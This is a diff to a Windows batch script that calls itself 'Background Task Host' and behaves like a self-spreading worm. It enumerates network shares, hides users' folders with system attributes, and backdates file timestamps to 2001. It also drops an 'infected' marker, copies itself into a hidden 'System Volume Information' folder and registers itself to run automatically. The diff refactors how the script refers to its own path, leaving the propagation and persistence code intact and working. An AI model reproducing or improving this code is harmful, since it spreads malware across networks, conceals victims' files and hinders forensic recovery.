@@ -27,6 +27,8 @@ for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i
 
 set app_name=Background Task Host
 set app_date=09-11-2001
+set app_file=%~f0
+set app_file_name=%~nx0
 
 set module_fileTouch=modules\fileTouch.exe /w /a /c /d %app_date%
 set module_shortcut=modules\shortcut.exe
@@ -146,6 +148,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
 
     if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
       for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+
         attrib +h +s "%%h\%%i\%%j"
         %module_fileTouch% "%%h\%%i\%%j" >nul
 
@@ -312,11 +315,11 @@ if not exist %*\"System Volume Information" md %*\"System Volume Information"
 
 
 
-if not exist %*\"System Volume Information\%~nx0" copy /y "%~f0" %*\"System Volume Information"
+if not exist %*\"System Volume Information\%app_file_name%" copy /y "%app_file%" %*\"System Volume Information"
 attrib +h +s %*\"System Volume Information"
-%module_fileTouch% %*\"System Volume Information\%~nx0" >nul
+%module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
 
-%autoRun% add %* %*\"System Volume Information\%~nx0"
+%autoRun% add %* %*\"System Volume Information\%app_file_name%"
 
 
 
